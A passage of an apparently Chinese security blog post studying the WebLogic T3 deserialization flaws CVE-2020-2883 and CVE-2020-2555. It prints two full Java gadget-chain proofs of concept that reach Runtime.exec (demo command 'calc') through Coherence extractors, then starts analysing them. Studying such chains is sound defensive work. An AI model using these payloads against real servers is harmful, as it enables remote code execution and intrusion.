<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="MagicZer0&#x2F;Weblogic_CVE-2020-2883_POC给出的两个利用链分别如下 Gadget1： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.tangosol.coher">
<meta property="og:type" content="article">
<meta property="og:title" content="WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555">
<meta property="og:url" content="https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/index.html">
<meta property="og:site_name" content="R17a&#39;s blog">
<meta property="og:description" content="MagicZer0&#x2F;Weblogic_CVE-2020-2883_POC给出的两个利用链分别如下 Gadget1： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.tangosol.coher">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805095214818.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805105654502.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805111353750.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805111542794.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805112401081.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805113829218.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805123552569.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805141002717.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805141550303.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805142434559.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805144053498.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805144240793.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805155956061.png">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20200805160242650.png">
<meta property="article:published_time" content="2020-07-31T06:02:06.000Z">
<meta property="article:modified_time" content="2020-07-31T06:02:06.000Z">
<meta property="article:author" content="R17a">
<meta property="article:tag" content="WebLogic">
<meta property="article:tag" content="T3">
<meta property="article:tag" content="CVE-2020-2883">
<meta property="article:tag" content="CVE-2020-2555">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://r17a-17.github.io/imgs/image-20200805095214818.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&text=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&is_video=false&description=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555&body=Check out this article: https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&title=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&name=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2020/07/31/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/&t=WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget1分析"><span class="toc-number">1.</span> <span class="toc-text">Gadget1分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一部分：命令执行链"><span class="toc-number">1.1.</span> <span class="toc-text">第一部分：命令执行链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二部分："><span class="toc-number">1.2.</span> <span class="toc-text">第二部分：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三部分：触发命令执行"><span class="toc-number">1.3.</span> <span class="toc-text">第三部分：触发命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget2分析"><span class="toc-number">2.</span> <span class="toc-text">Gadget2分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-2555-Gadget分析"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-2555 Gadget分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思考总结"><span class="toc-number">4.</span> <span class="toc-text">思考总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">4.1.</span> <span class="toc-text">参考链接：</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        WebLogic系列漏洞学习之T3：CVE-2020-2883和CVE-2020-2555
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">R17a</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-07-31T06:02:06.000Z" itemprop="datePublished">2020-07-31</time>
        
        (Updated: <time datetime="2020-07-31T06:02:06.000Z" itemprop="dateModified">2020-07-31</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/WebLogic/">WebLogic</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/WebLogic/T3/">T3</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CVE-2020-2555/" rel="tag">CVE-2020-2555</a>, <a class="tag-link" href="/tags/CVE-2020-2883/" rel="tag">CVE-2020-2883</a>, <a class="tag-link" href="/tags/T3/" rel="tag">T3</a>, <a class="tag-link" href="/tags/WebLogic/" rel="tag">WebLogic</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><a href="https://github.com/MagicZer0/Weblogic_CVE-2020-2883_POC" target="_blank" rel="noopener">MagicZer0/Weblogic_CVE-2020-2883_POC</a>给出的两个利用链分别如下</p>
<p>Gadget1：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.coherence.reporter.extractor.ConstantExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.comparator.ExtractorComparator;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * java.util.PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment"> *   java.util.PriorityQueue.heapify()</span></span><br><span class="line"><span class="comment"> *   java.util.PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment"> *   java.util.PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment"> *   com.tangosol.util.extractor.AbstractExtractor.compare()</span></span><br><span class="line"><span class="comment"> *     com.tangosol.util.extractor.MultiExtractor.extract()</span></span><br><span class="line"><span class="comment"> *       com.tangosol.util.extractor.ChainedExtractor.extract()</span></span><br><span class="line"><span class="comment"> *         //...</span></span><br><span class="line"><span class="comment"> *         Method.invoke()</span></span><br><span class="line"><span class="comment"> *             //...</span></span><br><span class="line"><span class="comment"> *           Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gadget1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = <span class="string">"calc"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantExtractor(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new ReflectionExtractor("getMethod", new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(valueExtractors);</span><br><span class="line"></span><br><span class="line">        ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">        Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">        m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_extractor.set(extractorComparator, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        priorityQueue.add(<span class="string">"foo"</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">"bar"</span>);</span><br><span class="line"></span><br><span class="line">        Field comparator = priorityQueue.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, extractorComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Gadget2:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.coherence.reporter.extractor.ConstantExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.internal.sleepycat.persist.evolve.Mutations;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.comparator.ExtractorComparator;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentNavigableMap;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentSkipListMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * javax.management.BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment"> *   com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()</span></span><br><span class="line"><span class="comment"> *     java.util.concurrent.ConcurrentSkipListMap$SubMap.size()</span></span><br><span class="line"><span class="comment"> *     java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()</span></span><br><span class="line"><span class="comment"> *       java.util.concurrent.ConcurrentSkipListMap.cpr()</span></span><br><span class="line"><span class="comment"> *         com.tangosol.util.comparator.ExtractorComparator.compare()</span></span><br><span class="line"><span class="comment"> *           com.tangosol.util.extractor.ChainedExtractor.extract()</span></span><br><span class="line"><span class="comment"> *           com.tangosol.util.extractor.ReflectionExtractor().extract()</span></span><br><span class="line"><span class="comment"> *             Method.invoke()</span></span><br><span class="line"><span class="comment"> *             //...</span></span><br><span class="line"><span class="comment"> *           com.tangosol.util.extractor.ReflectionExtractor().extract()</span></span><br><span class="line"><span class="comment"> *             Method.invoke()</span></span><br><span class="line"><span class="comment"> *               Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gadget2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = <span class="string">"calc"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantExtractor(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new ReflectionExtractor("getMethod", new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(valueExtractors);</span><br><span class="line"></span><br><span class="line">        ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">        Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">        m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_extractor.set(extractorComparator, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        ConcurrentSkipListMap concurrentSkipListMap = <span class="keyword">new</span> ConcurrentSkipListMap&lt;String, String&gt;();</span><br><span class="line">        Field comparator = concurrentSkipListMap.getClass().getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator.set(concurrentSkipListMap, extractorComparator);</span><br><span class="line"></span><br><span class="line">        ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap(<span class="string">"foo"</span>, <span class="keyword">false</span>, <span class="string">"bar"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// crafted Mutations Object</span></span><br><span class="line">        Mutations mutations = <span class="keyword">new</span> Mutations();</span><br><span class="line">        Field renamers = mutations.getClass().getDeclaredField(<span class="string">"renamers"</span>);</span><br><span class="line">        renamers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        renamers.set(mutations, subMap);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, mutations);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(val);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gadget1分析"><a href="#Gadget1分析" class="headerlink" title="Gadget1分析"></a>Gadget1分析</h2><p>因为之前分析过CommonsCollections利用链，有了经验，所以分析起来也更简单一点。还跟之前一样，分三部分来分析。</p>
<h3 id="第一部分：命令执行链"><a href="#第一部分：命令执行链" class="headerlink" title="第一部分：命令执行链"></a>第一部分：命令执行链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      String command = <span class="string">"calc"</span>;</span><br><span class="line">      ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">              <span class="keyword">new</span> ConstantExtractor(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">              new ReflectionExtractor("getMethod", new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">              <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">              <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(valueExtractors);</span><br><span class="line"></span><br><span class="line">ExtractorComparator extractorComparator = <span class="keyword">new</span> ExtractorComparator&lt;Object&gt;();</span><br><span class="line">      Field m_extractor = extractorComparator.getClass().getDeclaredField(<span class="string">"m_extractor"</span>);</span><br><span class="line">      m_extractor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_extractor.set(extractorComparator, chainedExtractor);</span><br></pre></td></tr></table></figure>

<p>这部分都是跟ValueExtractor相关的，跟CommonsCollections类似，只不过之前CommonsCollections是利用的Transformer。先分析下ValueExtractor、ConstantExtractor、ReflectionExtractor、ChainedExtractor，除了用到了构造方法，Gagdet里面提到了extract()，所以我们每个类的extract()都分析下。</p>
<p><img src="/imgs/image-20200805095214818.png" alt="ValueExtractor继承关系"></p>
<table>
<thead>
<tr>
<th>类名</th>
<th>方法及用途</th>
</tr>
</thead>
<tbody><tr>
